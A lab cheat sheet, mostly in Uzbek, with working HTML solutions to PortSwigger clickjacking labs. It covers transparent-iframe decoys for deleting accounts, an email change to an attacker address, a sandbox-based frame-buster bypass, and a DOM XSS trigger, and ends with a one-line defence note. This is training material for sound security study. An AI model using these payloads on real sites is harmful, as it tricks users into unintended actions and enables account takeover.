# Clickjacking — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Pattern bitta: target sahifani shaffof (opacity ~0.0001) iframe'da ustiga qo'yib, decoy
> `div` ni tugma ustiga joylaysan. Victim decoy'ni bosadi → aslida target tugmani bosadi.
> Align qilayotganda opacity=0.1, final'da 0.0001. Chrome'da sinaysan (victim Chrome).
> Real "Delete account" tugmasini O'ZING bosma — lab buziladi (~20 daq reset).

### Basic clickjacking (CSRF token himoyalangan) — APPRENTICE
Token bor, lekin clickjacking token'ni ham avtomat yuboradi. Delete account ustiga decoy.
```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  div { position: absolute; top: 300px; left: 60px; z-index: 1; }
</style>
<div>Click me</div>
<iframe src="https://example.com/my-account"></iframe>
```
> `top/left` ni "Delete account" tugmasiga to'g'rila.

### Prefilled form input (URL param) — APPRENTICE
Email URL paramdan to'ldiriladi → iframe src'ga email'ni qo'shasan, decoy "Update email" ustida.
```html
<style>
    iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
    div { position:absolute; top:400px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://example.com/my-account?email=attacker@evil-user.net"></iframe>
```

### Frame buster script bor — PRACTITIONER
Sayt frame-busting qiladi → `sandbox="allow-forms"` script'ni o'chiradi, lekin forma ishlaydi.
```html
<style>
    iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
    div { position:absolute; top:385px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://example.com/my-account?email=attacker@evil-user.net"></iframe>
```
> `sandbox="allow-forms"` — JS (frame buster) o'chadi, forma submit qiladi.

### Clickjacking → DOM-based XSS trigger — PRACTITIONER
Feedback sahifasida DOM XSS bor. iframe src'ga XSS payload + decoy "Submit" ustida.
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  div { position:absolute; top:610px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://example.com/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

### Multistep clickjacking — PRACTITIONER
Delete account + confirmation "Yes" = 2 ta klik → 2 ta decoy div.
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  .decoy1 { position:absolute; top:330px; left:50px; z-index:1; }
  .decoy2 { position:absolute; top:285px; left:225px; z-index:1; }
</style>
<div class="decoy1">Click me first</div>
<div class="decoy2">Click me next</div>
<iframe src="https://example.com/my-account"></iframe>
```
> decoy1 → "Delete account", decoy2 → confirmation "Yes" ustida.

---

### Eslatma
Himoya: `X-Frame-Options: DENY` yoki CSP `frame-ancestors 'none'`. Umumiy: bu papka README.
